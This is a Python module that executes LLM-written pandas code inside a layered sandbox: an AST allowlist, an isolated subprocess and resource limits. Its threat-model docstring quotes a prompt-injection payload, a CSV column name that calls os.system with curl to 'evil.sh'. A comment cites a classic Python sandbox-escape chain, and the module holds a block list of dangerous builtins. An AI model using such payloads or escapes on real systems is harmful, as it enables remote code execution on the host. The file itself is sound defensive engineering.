"""Executing LLM-written code safely-ish.

THREAT MODEL (be honest about this in an interview)
---------------------------------------------------
The model writes pandas code; we run it. If a prompt injection lives inside the
CSV itself (a column literally named `__import__('os').system('curl evil.sh')`),
naive `exec()` is remote code execution.

Three independent layers, because any one of them can be bypassed:

  1. STATIC  — AST allowlist. Reject imports, dunder access, `eval`/`exec`/
               `open`/`getattr`, and attribute chains used for sandbox escape.
  2. RUNTIME — separate subprocess with stripped builtins, so a bypass gets a
               crippled interpreter rather than ours.
  3. RESOURCE— OS-level CPU/memory/file-size limits + wall-clock timeout, so an
               infinite loop or fork bomb dies instead of taking down the API.

WHAT THIS IS NOT: a real sandbox. Escapes from CPython restricted-eval are a
known research sport. For production, run this subprocess inside a container
with no network namespace and a read-only filesystem. That's a one-line
docker-compose change and it's noted in the README.
"""

from __future__ import annotations

import ast
import json
import subprocess
import sys
from dataclasses import dataclass
from pathlib import Path

from .logging_setup import get_logger

log = get_logger(__name__)

MAX_OUTPUT_CHARS = 4000
_RUNNER_PATH = Path(__file__).parent / "_runner.py"

# Names that are never legitimate in a data-analysis snippet.
FORBIDDEN_NAMES = {
    "eval", "exec", "compile", "open", "input", "__import__", "globals",
    "locals", "vars", "getattr", "setattr", "delattr", "breakpoint", "exit",
    "quit", "memoryview", "help",
}
# The only modules the snippet may import (it doesn't need to: pd/np/df are
# already in scope, but models habitually write `import pandas as pd`).
ALLOWED_IMPORTS = {"pandas", "numpy", "math", "statistics", "re", "collections", "datetime"}


class UnsafeCodeError(ValueError):
    """Raised when static analysis rejects a snippet."""


@dataclass
class SandboxResult:
    ok: bool
    stdout: str = ""
    result: str = ""
    error: str = ""

    def to_tool_text(self) -> str:
        """Format for feeding back to the model."""
        if not self.ok:
            return f"EXECUTION FAILED\n{self.error}"
        parts = []
        if self.stdout.strip():
            parts.append(f"stdout:\n{self.stdout.strip()}")
        if self.result.strip():
            parts.append(f"result:\n{self.result.strip()}")
        return "\n\n".join(parts) if parts else "(code ran, but produced no output)"


def validate_code(code: str) -> None:
    """Layer 1. Raise UnsafeCodeError if the snippet does anything but analyse data."""
    try:
        tree = ast.parse(code, mode="exec")
    except SyntaxError as e:
        raise UnsafeCodeError(f"SyntaxError: {e}") from e

    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                root = alias.name.split(".")[0]
                if root not in ALLOWED_IMPORTS:
                    raise UnsafeCodeError(f"import of {alias.name!r} is not allowed")

        elif isinstance(node, ast.ImportFrom):
            root = (node.module or "").split(".")[0]
            if root not in ALLOWED_IMPORTS:
                raise UnsafeCodeError(f"import from {node.module!r} is not allowed")

        elif isinstance(node, ast.Name) and node.id in FORBIDDEN_NAMES:
            raise UnsafeCodeError(f"use of {node.id!r} is not allowed")

        elif isinstance(node, ast.Attribute) and node.attr.startswith("__"):
            # Blocks the classic `().__class__.__bases__[0].__subclasses__()` escape.
            raise UnsafeCodeError(f"access to dunder attribute {node.attr!r} is not allowed")

        # Pandas has its own footguns that touch the filesystem / network.
        elif isinstance(node, ast.Attribute) and node.attr.startswith(("to_", "read_")):
            if node.attr not in {
                "to_string", "to_dict", "to_list", "to_numpy", "to_frame",
                "to_datetime", "to_numeric", "to_markdown", "to_json",
            }:
                raise UnsafeCodeError(f"{node.attr!r} may touch disk/network; not allowed")


def run_snippet(
    code: str,
    data_path: Path,
    timeout_s: int = 20,
    memory_mb: int = 1024,
) -> SandboxResult:
    """Validate, then execute in an isolated subprocess. Never raises."""
    try:
        validate_code(code)
    except UnsafeCodeError as e:
        log.warning("sandbox.rejected", reason=str(e))
        # Returned as a normal failure so the agent can read it and rewrite.
        return SandboxResult(ok=False, error=f"BLOCKED by safety check: {e}")

    payload = json.dumps(
        {"code": code, "data_path": str(data_path), "memory_mb": memory_mb}
    )

    try:
        proc = subprocess.run(
            [sys.executable, "-I", str(_RUNNER_PATH)],
            input=payload,
            capture_output=True,
            text=True,
            timeout=timeout_s,
            # -I = isolated mode: ignores PYTHON* env vars and the user site dir.
        )
    except subprocess.TimeoutExpired:
        log.warning("sandbox.timeout", timeout_s=timeout_s)
        return SandboxResult(
            ok=False,
            error=f"TIMEOUT after {timeout_s}s. Write a cheaper query "
                  f"(e.g. operate on a subset of columns).",
        )
    except Exception as e:  # pragma: no cover - defensive
        return SandboxResult(ok=False, error=f"Sandbox launch failed: {e}")

    if not proc.stdout.strip():
        return SandboxResult(
            ok=False,
            error=f"Process died (exit {proc.returncode}). "
                  f"Likely out of memory. stderr: {proc.stderr[-500:]}",
        )

    try:
        data = json.loads(proc.stdout.strip().splitlines()[-1])
    except json.JSONDecodeError:
        return SandboxResult(ok=False, error=f"Malformed sandbox output: {proc.stdout[:500]}")

    return SandboxResult(
        ok=data.get("ok", False),
        stdout=data.get("stdout", "")[:MAX_OUTPUT_CHARS],
        result=data.get("result", "")[:MAX_OUTPUT_CHARS],
        error=data.get("error", "")[:MAX_OUTPUT_CHARS],
    )
